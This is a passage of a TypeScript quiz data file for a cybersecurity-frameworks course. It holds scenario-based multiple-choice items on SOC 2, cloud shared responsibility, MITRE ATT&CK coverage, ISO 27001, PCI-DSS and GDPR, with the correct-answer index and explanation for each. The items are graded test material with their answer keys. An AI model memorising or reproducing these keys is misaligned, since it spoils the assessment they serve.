        explanation: "Type II reports routinely include exceptions. What matters is severity, pervasiveness, whether compensating controls existed, and the credibility of remediation. An unqualified opinion with a small number of documented, remediated exceptions is normal; reviewers read the exception table and management responses closely."
      },
      {
        id: "cf-q8-4",
        difficulty: "hard",
        tags: ["Shared Responsibility"],
        scenario: "Incident: an S3-equivalent object store bucket holding customer exports was publicly readable for 11 days due to a bucket policy change pushed by your infrastructure team. The provider's control plane logged the change correctly.",
        question: "Under the shared responsibility model, whose failure is this?",
        options: [
          "The cloud provider's — they should prevent public buckets by default",
          "The customer's — configuration of storage access, data classification and encryption is customer responsibility; the provider is responsible for security OF the cloud, the customer for security IN the cloud",
          "Shared equally, so neither party is accountable",
          "The auditor's, for not catching it"
        ],
        correctAnswer: 1,
        explanation: "Providers secure the underlying infrastructure, hypervisor and physical layer. Customers own IAM, resource configuration, data classification, encryption choices and monitoring of their own changes. Preventive guardrails (SCPs/policies blocking public access) plus CSPM detection are the customer-side controls that would have prevented or shortened this exposure."
      },
      {
        id: "cf-q8-5",
        difficulty: "medium",
        tags: ["CSA CCM", "STAR"],
        scenario: "A prospective cloud vendor offers a completed CAIQ and claims CSA STAR Level 1.",
        question: "What does that actually tell you?",
        options: [
          "It is an independently audited certification equivalent to ISO 27001",
          "STAR Level 1 is self-assessment (CAIQ/CCM responses published to the registry) — useful transparency, but not independently verified; Level 2 adds third-party audit",
          "STAR Level 1 supersedes SOC 2 for cloud providers",
          "CAIQ is a penetration test report"
        ],
        correctAnswer: 1,
        explanation: "The CSA Cloud Controls Matrix is the control framework; the CAIQ is the questionnaire mapped to it. STAR Level 1 is self-assessment published to a public registry. Level 2 is third-party certification/attestation (often paired with ISO 27001 or SOC 2). Treat Level 1 as vendor-asserted input to your own assessment."
      },
      {
        id: "cf-q8-6",
        difficulty: "medium",
        tags: ["Complementary Controls"],
        scenario: "A vendor's SOC 2 report includes a section titled \"Complementary User Entity Controls\" listing items such as: the user entity is responsible for provisioning and reviewing its own user accounts and for configuring SSO enforcement.",
        question: "What must your organisation do with this section?",
        options: [
          "Ignore it — it describes the vendor's internal controls",
          "Treat each CUEC as a control you must implement and evidence on your side; the vendor's opinion assumes these are operating",
          "Send it back to the vendor for removal",
          "Use it as proof that the vendor manages your accounts"
        ],
        correctAnswer: 1,
        explanation: "CUECs are the assumptions the service auditor made about controls at the customer. If you do not implement them, the assurance in the report does not extend to your usage. Mature TPRM programmes extract CUECs from every vendor report and assign owners internally."
      },
      {
        id: "cf-q8-7",
        difficulty: "easy",
        tags: ["SOC Report Types"],
        scenario: "A finance team asks for a report relevant to internal control over financial reporting for your payroll-processing service; your security team offers the SOC 2.",
        question: "What should be provided instead?",
        options: [
          "SOC 1 — designed for controls relevant to user entities' internal control over financial reporting",
          "SOC 3 — the public summary report",
          "SOC 2 Type I is the correct financial report",
          "ISO 27001 certificate"
        ],
        correctAnswer: 0,
        explanation: "SOC 1 (SSAE 18) addresses controls relevant to financial reporting and is what auditors of your customers need for ICFR purposes. SOC 2 covers Trust Services Criteria for security and related attributes; SOC 3 is a public, general-use summary of a SOC 2 without detailed testing results."
      },
      {
        id: "cf-q8-8",
        difficulty: "hard",
        tags: ["Cloud Guardrails"],
        scenario: "Post-incident hardening options for the public bucket exposure:\n  A) Weekly manual configuration review\n  B) Organisation-level policy denying public access, enforced above account admins\n  C) CSPM alerting on public buckets within 5 minutes\n  D) Quarterly awareness training for engineers",
        question: "Which combination best reflects a preventive-plus-detective control design?",
        options: [
          "A and D",
          "B (preventive guardrail that cannot be bypassed by account admins) plus C (detective control catching drift and exceptions)",
          "C alone, since detection is sufficient",
          "D alone, since the root cause was human error"
        ],
        correctAnswer: 1,
        explanation: "Preventive guardrails enforced at the organisation level stop the misconfiguration from being possible, including by privileged account users. CSPM provides the detective layer for anything that slips through (new accounts, exempted resources). Manual review and training reduce but do not bound the risk."
      }
    ]
  },
  {
    quizId: "cf-q9",
    courseId: "cybersecurity-frameworks",
    title: "MITRE ATT&CK, D3FEND & Control Cross-Mapping",
    description: "Threat-informed defence: mapping controls to techniques, coverage analysis, and integrating multiple frameworks.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "cf-q9-1",
        difficulty: "medium",
        tags: ["ATT&CK", "Coverage"],
        scenario: "Coverage heatmap extract (Enterprise matrix):\n  Initial Access: 8/10 techniques with detections\n  Execution: 7/12\n  Persistence: 2/19\n  Credential Access: 3/17\n  Exfiltration: 1/9\nThe last three incidents all involved credential theft followed by data staging and exfiltration.",
        question: "Where should the next quarter's detection engineering effort go, and why?",
        options: [
          "Initial Access, to push coverage from 8/10 to 10/10",
          "Credential Access and Exfiltration — lowest coverage on the tactics with demonstrated adversary use against this organisation",
          "Execution, because it has the most techniques overall",
          "Spread evenly to make every tactic show 50% coverage"
        ],
        correctAnswer: 1,
        explanation: "Threat-informed defence prioritises by the intersection of low coverage and observed/likely adversary behaviour. Chasing the last two Initial Access techniques adds little marginal risk reduction, while Credential Access and Exfiltration are both weak and proven relevant to this environment's actual incidents."
      },
      {
        id: "cf-q9-2",
        difficulty: "hard",
        tags: ["Coverage Fallacy"],
        scenario: "A dashboard claims 78% ATT&CK coverage. Investigation shows each technique is counted as covered if any single rule references it, several rules are disabled, and 40% have never fired or been validated.",
        question: "What is the central flaw?",
        options: [
          "Percentages should be shown to two decimal places",
          "Coverage counted by rule existence rather than validated detection efficacy overstates defence; coverage must be measured by tested detections with known true-positive behaviour and required telemetry present",
          "78% is simply too low a target",
          "ATT&CK should not be used for measurement at all"
        ],
        correctAnswer: 1,
        explanation: "Binary rule-exists mapping is the classic coverage fallacy. Meaningful measurement requires: the telemetry source exists and is healthy, the rule is enabled and tuned, and its efficacy has been validated (Atomic Red Team, purple team, or adversary emulation) with a confidence rating per technique."
      },
      {
        id: "cf-q9-3",
        difficulty: "easy",
        tags: ["D3FEND"],
        scenario: "An architect wants a structured vocabulary for the defensive countermeasures being deployed and how they relate to the offensive techniques they counter.",
        question: "Which MITRE resource fits?",
        options: [
          "D3FEND — a knowledge graph of defensive techniques and their relationships to offensive techniques and digital artifacts",
          "ATT&CK Navigator, which is a countermeasure catalogue",
          "CAR, which lists compliance controls",
          "Engage, which is a patch management standard"
        ],
        correctAnswer: 0,
        explanation: "D3FEND catalogues defensive techniques (harden, detect, isolate, deceive, evict) and ties them via digital artifacts to the offensive techniques they counter. ATT&CK Navigator is a visualisation tool for ATT&CK layers; CAR is the Cyber Analytics Repository of detection analytics; Engage covers adversary engagement/denial and deception."
      },
      {
        id: "cf-q9-4",
        difficulty: "hard",
        tags: ["Cross-Mapping"],
        scenario: "Control inventory needs to answer three different audiences:\n  Board: \"Are we improving against the threats that matter?\"\n  Auditor: \"Show me evidence for ISO 27001 Annex A and SOC 2 CC6.\"\n  SOC lead: \"Which techniques can we detect?\"",
        question: "What integration approach satisfies all three without triplicating work?",
        options: [
          "Maintain three separate, independent control lists per audience",
          "Maintain one authoritative control inventory with mappings to ATT&CK techniques, ISO Annex A, SOC 2 criteria and CSF subcategories, then generate audience-specific views from it",
          "Adopt only ATT&CK and tell auditors to accept it",
          "Adopt only ISO 27001 and stop tracking techniques"
        ],
        correctAnswer: 1,
        explanation: "A single control inventory with many-to-many mappings is the standard integration pattern: test a control once, report it many ways. Board gets threat-coverage trend, auditors get framework-mapped evidence, and the SOC gets technique-level detection status — all from the same tested artefacts."
      },
      {
        id: "cf-q9-5",
        difficulty: "medium",
        tags: ["Sub-techniques"],
        scenario: "A detection is mapped to T1566 (Phishing). Analysis of the last 20 incidents shows 14 were T1566.001 (Spearphishing Attachment), 5 were T1566.002 (Link), and 1 was T1566.003 (via Service). The detection only inspects email attachments.",
        question: "What is the mapping problem?",
        options: [
          "Mapping to the parent technique overstates coverage; the detection covers T1566.001 only, leaving .002 and .003 unaddressed",
          "Sub-techniques should never be used in mapping",
          "T1566 is deprecated in current ATT&CK versions",
          "The detection should be mapped to a tactic instead of a technique"
        ],
        correctAnswer: 0,
        explanation: "Parent-technique mapping hides sub-technique gaps. Precision matters: map to the sub-technique actually covered, then the coverage view honestly shows link-based and service-based phishing as gaps requiring URL detonation and third-party messaging telemetry."
      },
      {
        id: "cf-q9-6",
        difficulty: "hard",
        tags: ["Adversary Emulation"],
        scenario: "The team wants to validate defences against a ransomware affiliate known to use valid accounts for access, WMI for execution, vssadmin for shadow copy deletion, and rclone for exfiltration to cloud storage.",
        question: "What is the most rigorous validation approach?",
        options: [
          "Run a vulnerability scan of all endpoints",
          "Build an adversary emulation plan replaying that specific technique chain in a controlled test, and measure detection, alert fidelity and response time at each step",
          "Ask the EDR vendor whether their product detects ransomware",
          "Review the SIEM rule list for the word ransomware"
        ],
        correctAnswer: 1,
        explanation: "Emulating the actual technique chain end-to-end tests telemetry, detection logic, alert routing and analyst response together — including the chained detections a real intrusion would trigger. Vendor claims, scans, and keyword rule reviews validate none of these. Atomic tests cover single techniques; emulation plans cover the chain."
      },
      {
        id: "cf-q9-7",
        difficulty: "medium",
        tags: ["Framework Roles"],
        scenario: "Four artefacts on the programme roadmap: NIST CSF, ISO 27001, CIS Controls v8, MITRE ATT&CK.",
        question: "Which description of their complementary roles is most accurate?",
        options: [
          "They are competing alternatives; pick exactly one",
          "CSF gives outcome-based structure and board language, ISO 27001 provides a certifiable management system, CIS gives prioritised technical safeguards, ATT&CK provides the adversary-behaviour lens to test whether those controls actually work",
          "ATT&CK is a compliance standard that replaces ISO 27001",
          "CIS Controls certify the ISMS while CSF audits it"
        ],
        correctAnswer: 1,
        explanation: "These operate at different layers: management system (ISO), outcome framework and communication (CSF), prioritised technical implementation (CIS), and threat-behaviour validation (ATT&CK). Mature programmes use all four, mapped together, rather than choosing between them."
      },
      {
        id: "cf-q9-8",
        difficulty: "medium",
        tags: ["Data Sources"],
        scenario: "A proposed detection for T1055 (Process Injection) is written, but the environment collects only Windows Security event logs — no Sysmon, no EDR telemetry on the affected server group.",
        question: "What must happen before the detection can be considered coverage?",
        options: [
          "Nothing — writing the rule is sufficient to claim coverage",
          "The required data source must exist first; identify the telemetry gap (Sysmon/EDR process access and image load events), close it, then validate the detection fires",
          "Map the technique to a compensating ISO control and move on",
          "Downgrade the technique to out of scope"
        ],
        correctAnswer: 1,
        explanation: "Detection engineering is data-source-first. ATT&CK documents the data sources and components each technique requires; without process-access/image-load telemetry, a T1055 rule can never fire. Honest coverage tracking records the gap as a telemetry deficiency with an owner, rather than as a written rule."
      }
    ]
  },
  {
    quizId: "cf-q10",
    courseId: "cybersecurity-frameworks",
    title: "Cybersecurity Frameworks Certification Exam",
    description: "Comprehensive scenario-based final exam across governance, NIST CSF, ISO 27001, CIS, risk management, PCI-DSS, privacy, SOC 2 and threat-informed defence.",
    passingScore: 80,
    timeLimit: 60,
    questions: [
      {
        id: "cf-q10-1",
        difficulty: "medium",
        tags: ["Governance"],
        scenario: "A newly appointed CISO inherits: no risk register, policies last reviewed in 2018, an engaged board, and a $1.2M budget.",
        question: "What is the correct first move?",
        options: [
          "Purchase a next-generation SIEM to gain visibility immediately",
          "Establish the risk register and asset inventory to make every subsequent investment risk-justified",
          "Begin ISO 27001 certification within 30 days",
          "Run a red team exercise to demonstrate the problem"
        ],
        correctAnswer: 1,
        explanation: "Without an asset inventory and risk register, every spend is unjustified and unmeasurable. Establishing the risk baseline creates the language for board reporting, prioritises the roadmap, and makes later certification or tooling decisions defensible."
      },
      {
        id: "cf-q10-2",
        difficulty: "hard",
        tags: ["NIST CSF"],
        scenario: "The current profile shows strong Protect and Detect, weak Respond and Recover. A tabletop exercise ends with the team unable to say who authorises taking production offline.",
        question: "Which CSF outcome family most directly addresses the tabletop failure?",
        options: [
          "PR.AC — access control",
          "RS.MA / GV.RR — incident management with clearly defined roles, responsibilities and decision authority",
          "ID.AM — asset management",
          "DE.CM — continuous monitoring"
        ],
        correctAnswer: 1,
        explanation: "The failure is decision authority during response, which lives in Respond (incident management) informed by GOVERN's roles and responsibilities. Technical detection was fine; the gap was governance of the response decision, which is exactly what tabletops are designed to expose."
      },
      {
        id: "cf-q10-3",
        difficulty: "medium",
        tags: ["ISO 27001"],
        scenario: "Certification body finding: \"Objective evidence of management review for the past 12 months could not be produced.\"",
        question: "What is the likely classification and remedy?",
        options: [
          "Observation only — management review is optional",
          "Nonconformity against Clause 9.3 — schedule and document management reviews with defined inputs and outputs, then evidence corrective action",
          "Nonconformity against Annex A.5.1 — rewrite the policies",
          "No action needed until recertification"
        ],
        correctAnswer: 1,
        explanation: "Clause 9.3 mandates management review at planned intervals with specified inputs (audit results, performance, risk status, improvement opportunities) and documented outputs. Missing 12 months of evidence is a nonconformity requiring root cause analysis and corrective action, not an observation."
      },
      {
        id: "cf-q10-4",
        difficulty: "hard",
        tags: ["Risk Quantification"],
        scenario: "AV = $2.5M, EF = 40%, ARO = 0.5. A control costing $300K/yr reduces EF to 10%.",
        question: "What is the annual net benefit?",
        options: [
          "$75,000",
          "$375,000",
          "$500,000 loss",
          "$125,000"
        ],
        correctAnswer: 0,
        explanation: "Before: SLE = $2.5M x 0.40 = $1M; ALE = $1M x 0.5 = $500K. After: SLE = $2.5M x 0.10 = $250K; ALE = $250K x 0.5 = $125K. Reduction = $375K. Net benefit = $375K - $300K control cost = $75K per year — positive but thin, so sensitivity of the ARO estimate matters."
      },
      {
        id: "cf-q10-5",
        difficulty: "medium",
        tags: ["CIS Controls"],
        scenario: "An organisation with no dedicated security staff wants a defensible starting roadmap in 90 days.",
        question: "What should the roadmap anchor on?",
        options: [
          "CIS IG1 safeguards, beginning with asset and software inventory, then account/access management and secure configuration",
          "MITRE ATT&CK full-matrix coverage",
          "SOC 2 Type II readiness",
          "A red team engagement followed by IG3 safeguards"
        ],
        correctAnswer: 0,
        explanation: "IG1 is designed exactly for this profile: essential cyber hygiene achievable with limited expertise. Starting at inventory (Controls 1 and 2) makes every later control measurable. ATT&CK coverage and SOC 2 readiness both presuppose capabilities this organisation does not yet have."
      },
      {
        id: "cf-q10-6",
        difficulty: "hard",
        tags: ["PCI-DSS"],
        scenario: "During the annual assessment the QSA finds a developer laptop with a CSV export of 4,000 PANs used for debugging a failed batch six months ago.",
        question: "What are the immediate compliance implications?",
        options: [
          "None, since the file was for debugging",
          "The laptop becomes part of the CDE, the export violates storage/retention and access requirements, the data must be securely deleted, scope and risk reassessed, and the incident handled under the response plan",
          "Only a documentation update is needed",
          "The laptop can be excluded by declaring it out of scope"
        ],
        correctAnswer: 1,
        explanation: "Cardholder data defines scope wherever it lands. An unauthorised PAN export drags the endpoint into the CDE, breaches retention/need-to-know requirements, and triggers secure deletion, scope reassessment and incident handling — plus root-cause work on why production data reached a developer endpoint."
      },
      {
        id: "cf-q10-7",
        difficulty: "medium",
        tags: ["GDPR"],
        scenario: "A processor discovers a breach affecting a controller's data at 14:00 on Monday.",
        question: "What is the processor's obligation?",
        options: [
          "Notify the supervisory authority within 72 hours directly",
          "Notify the controller without undue delay; the controller then assesses and notifies the supervisory authority within 72 hours of its awareness",
          "Notify affected data subjects immediately",
          "No obligation unless the contract specifies one"
        ],
        correctAnswer: 1,
        explanation: "Art. 33(2) requires the processor to notify the controller without undue delay. The controller owns the assessment and any Art. 33 authority notification and Art. 34 data-subject communication. Processing agreements typically tighten this into a contractual SLA (often 24-48 hours)."
      },
      {
        id: "cf-q10-8",
        difficulty: "medium",
        tags: ["SOC 2"],
        scenario: "Sales wants a document they can publish on the public website to demonstrate security assurance without disclosing control detail or test results.",
        question: "Which report is designed for that?",
        options: [
          "SOC 3 — a general-use summary report suitable for public distribution",
          "SOC 2 Type II with a redacted exception table",
          "SOC 1 Type I",
          "The ISO 27001 Statement of Applicability"
        ],
        correctAnswer: 0,
        explanation: "SOC 3 is the general-use public report derived from a SOC 2 examination, containing the auditor's opinion and system description without detailed control testing or results. SOC 2 reports are restricted-use; publishing a redacted one is not the intended distribution model."
      },
      {
        id: "cf-q10-9",
        difficulty: "hard",
        tags: ["Third-Party Risk"],
        scenario: "A critical vendor refuses to provide a SOC 2 report or complete a security questionnaire, citing confidentiality, but the business insists the service is irreplaceable within the timeline.",
        question: "What is the most defensible path?",
        options: [
          "Onboard without assessment since the business need is urgent",
          "Escalate to the risk owner with the assessment gap quantified, negotiate contractual security terms, right-to-audit, breach notification SLA and compensating controls, and document a time-bound risk acceptance",
          "Refuse the vendor outright regardless of business impact",
          "Accept the vendor's verbal assurance and note it in the register"
        ],
        correctAnswer: 1,
        explanation: "Security's role is to make the risk visible and priced, not to unilaterally veto or silently approve. Quantify the unassessed exposure, push contractual protections and compensating controls (scoped access, monitoring, data minimisation), and require a documented, expiring acceptance signed by the accountable business owner."
      },
      {
        id: "cf-q10-10",
        difficulty: "medium",
        tags: ["ATT&CK"],
        scenario: "Board question: \"Are we getting better?\" Available metrics: number of alerts, number of rules written, validated technique coverage trend against the top three threat groups targeting the sector, and mean time to detect.",
        question: "Which pair best answers the board's question?",
        options: [
          "Alert count and rule count",
          "Validated technique coverage trend against relevant threat groups, plus mean time to detect",
          "Rule count alone",
          "Alert count and number of vendors onboarded"
        ],
        correctAnswer: 1,
        explanation: "Boards need outcome and trend, tied to relevant threats. Validated coverage against the adversaries that actually target your sector shows whether defence is improving where it matters; MTTD shows operational effectiveness. Alert and rule counts are activity metrics that can rise while risk gets worse."
      },
      {
        id: "cf-q10-11",
        difficulty: "hard",
        tags: ["Integration"],
        scenario: "The organisation must satisfy ISO 27001 certification, a customer's SOC 2 requirement, PCI-DSS for a payment channel, and internal CSF reporting — with one small GRC team.",
        question: "What is the efficient operating model?",
        options: [
          "Run four independent compliance programmes with separate evidence repositories",
          "Build a unified control framework: one control set, mapped to all four schemes, tested once per period with shared evidence and scheme-specific reporting views",
          "Certify to ISO 27001 only and tell other stakeholders it is equivalent",
          "Outsource each scheme to a different consultancy"
        ],
        correctAnswer: 1,
        explanation: "Overlap between these schemes is substantial (access control, change management, logging, vendor management). A unified control framework with cross-mappings lets you test once and report many times, cutting audit fatigue. Scheme-specific deltas (PCI scoping, ISO clauses 4-10) are then handled as targeted additions."
      },
      {
        id: "cf-q10-12",
        difficulty: "medium",
        tags: ["Maturity"],
        scenario: "Assessment: processes are documented and consistently followed, metrics are collected, but there is no evidence of using metrics to drive improvement or of predictive/adaptive change.",
        question: "Which maturity level does this describe on a typical five-level model?",
        options: [
          "Level 2 — Repeatable",
          "Level 3/4 boundary — Defined and Managed (measured), but not yet Optimising",
          "Level 5 — Optimising",
          "Level 1 — Initial"
        ],
        correctAnswer: 1,
        explanation: "Defined (3) means documented and consistently applied; Managed/Measured (4) adds quantitative metrics; Optimising (5) requires those metrics to drive continuous, often predictive improvement. Collecting metrics without acting on them is the classic stall between 4 and 5."
      }
    ]
  },
];

export const quizzes: QuizData[] = [...baseQuizzes, ...sapPart1, ...sapPart2, ...sapPart3, ...sapPart4,
  ...finalExams, ...socFinalExam];

export const getQuizById = (courseId: string, quizId: string): QuizData | undefined => {
  return quizzes.find(q => q.courseId === courseId && q.quizId === quizId);
};

export const getCourseQuizzes = (courseId: string): QuizData[] => {
  return quizzes.filter(q => q.courseId === courseId);
};
